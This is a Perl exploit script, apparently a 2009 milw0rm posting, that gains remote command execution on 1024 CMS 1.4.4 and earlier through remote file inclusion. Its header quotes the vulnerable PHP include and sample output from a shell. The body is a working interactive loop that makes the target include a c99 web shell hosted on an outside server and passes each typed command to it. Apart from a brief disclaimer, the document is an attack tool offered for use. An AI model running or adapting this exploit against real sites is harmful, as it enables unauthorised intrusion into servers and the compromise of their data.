<html><head><title>1024 CMS <= 1.4.4 Remote Command Execution with RFI (c99) Exploit</title></head><pre>#!/usr/bin/perl
####################################################################
# 1024 CMS &lt;= 1.4.4 Remote Command Execution with RFI (c99) Exploit
# download: http://www.trebledesigns.com/1024cms.zip
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://www.hack0wn.com/
# team: Spanish Hackers Team - [SHT]
#
# Hack0wn Security Project!!
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
####################################################################
#
# &quot;need&quot; allow_url_include = On &amp;&amp; register_globals = On
#
# RFI vuln!: [/themes/default/layouts/standard.php]
#    &lt;?php
#      if($page_ck['custom'] == 'N' || isset($page_include)) {
#       if(!isset($page_include)) include(&quot;./pages/&quot;.$page.&quot;/default/content.php&quot;);
#     else include($page_include);
#       } else {
#     ...
#
####################################################################
# OUTPUT: (tested on localhost)
#
# [shell]:~$ id
#  uid=33(www-data) gid=33(www-data) groups=33(www-data)
# [shell]:~$ uname -a
#  Linux h4x0rz 2.6.18-6-686 #1 SMP Fri Dec 12 16:48:28 UTC 2008 i686 GNU/Linux
# [shell]:~$ exit
# h4x0rz:/home/joss/Desktop#


use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&amp;clear();

sub banner {
        &amp;clear();
	print &quot;[x] 1024 CMS &lt;= 1.4.4 Remote Command Execution with RFI (c99) Exploit\n&quot;;
	print &quot;[x] Written By JosS\n&quot;;
	print &quot;[x] sys-project[at]hotmail[dot]com\n\n&quot;;
	print &quot;[+] Usage:\n&quot;;
	print &quot;[+]     $0 -vuln \&quot;web+path\&quot; -shell \&quot;shell\&quot;\n&quot;;
	print &quot;[+] eX: $0 -vuln \&quot;http://www.hack0wn.com/test/\&quot; -shell \&quot;http://hack0wn.com/c99.txt?\&quot;\n\n&quot;;
        exit();
}

my $options = GetOptions (
  'help!'            =&gt; \$help, 
  'vuln=s'            =&gt; \$vuln, 
  'shell=s'            =&gt; \$shell
  );

&amp;banner unless ($vuln);
&amp;banner unless ($shell);

&amp;banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print &quot;[shell]:~\$ &quot;;
	chomp($cmd=&lt;STDIN&gt;);

	if ($cmd eq &quot;exit&quot; || $cmd eq &quot;quit&quot;) {
		exit 0;
	}

	my $ua = LWP::UserAgent-&gt;new;
        $iny=&quot;?&amp;act=cmd&amp;cmd=&quot; . $cmd . &quot;&amp;d=/&amp;submit=1&amp;cmd_txt=1&quot;;
        chomp($iny);
        my $own = $vuln . &quot;/themes/default/layouts/standard.php?page_include=&quot; . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request-&gt;new(GET =&gt; $own);
	my $res = $ua-&gt;request($req);
	my $con = $res-&gt;content;
	if ($res-&gt;is_success){
		print $1,&quot;\n&quot; if ( $con =~ m/readonly&gt; (.*?)\&lt;\/textarea&gt;/mosix);
	}
           else
             {
                print &quot;[p0c] Exploit failed\n&quot;;
                exit(1);
             }
}

# __h0__

# milw0rm.com [2009-02-06]</pre></html>